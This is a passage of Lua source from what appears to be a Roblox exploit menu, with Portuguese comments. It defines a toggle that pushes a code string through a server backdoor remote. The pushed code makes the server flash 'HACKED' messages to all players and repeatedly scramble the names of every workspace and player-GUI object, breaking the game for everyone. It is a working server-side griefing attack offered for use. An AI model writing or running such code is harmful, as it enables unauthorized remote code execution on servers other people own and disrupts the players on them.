-- CRIPTO ALL SERVER-SIDE (Cria uma parede de Hints criptografados na tela de todo mundo)
grpServer:CreateToggle({Name = "CRIPTO ALL (Bugar Tela de Todos)", Icon = "terminal", Default = false, Callback = function(state)
    if not backdoorRemote then return end
    
    if state then
        local code = [[
            _G.MI_ServerCrypto = true
            task.spawn(function()
                local chars = "!@#$%^&*()_+{}|:<>?~1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
                local function scramble(str)
                    if not str or str == "" then return "" end
                    local out = {}
                    for i = 1, #str do local r = math.random(1, #chars); out[i] = chars:sub(r, r) end
                    if math.random(1, 100) <= 30 then return "HACKED" end
                    return table.concat(out)
                end

                while _G.MI_ServerCrypto do
                    for _, p in ipairs(game.Players:GetPlayers()) do
                        -- Cria um Hint piscando na tela do jogador
                        local hint = Instance.new("Hint")
                        hint.Text = "HACKED: " .. scramble("SYSTEM FAILURE")
                        hint.Parent = workspace
                        task.delay(0.1, function() if hint then hint:Destroy() end end)
                        
                        -- Altera os nomes dos objetos no PlayerGui (se der)
                        local pg = p:FindFirstChild("PlayerGui")
                        if pg then
                            for _, obj in ipairs(pg:GetDescendants()) do
                                if obj.Name ~= "Humanoid" and obj.Name ~= "HumanoidRootPart" then
                                    pcall(function() obj.Name = scramble(obj.Name) end)
                                end
                            end
                        end
                    end
                    
                    -- Altera os nomes de TUDO na workspace
                    for _, v in ipairs(workspace:GetDescendants()) do
                        if v.Name ~= "Humanoid" and v.Name ~= "HumanoidRootPart" and not v:IsA("Player") then
                            pcall(function() v.Name = scramble(v.Name) end)
                        end
                    end
                    
                    task.wait(0.1)
                end
            end)
        ]]
        pcall(function() if backdoorRemote:IsA("RemoteEvent") then backdoorRemote:FireServer(code) else backdoorRemote:InvokeServer(code) end end)
        win:Notify({Title = "CRIPTO ALL", Content = "Servidor hackeado. Todos os clientes afetados.", Duration = 3})
    else
        local code = [[ _G.MI_ServerCrypto = false ]]
        pcall(function() if backdoorRemote:IsA("RemoteEvent") then backdoorRemote:FireServer(code) else backdoorRemote:InvokeServer(code) end end)
        win:Notify({Title = "CRIPTO ALL", Content = "Parando a criptografia no servidor.", Duration = 3})
    end
end})

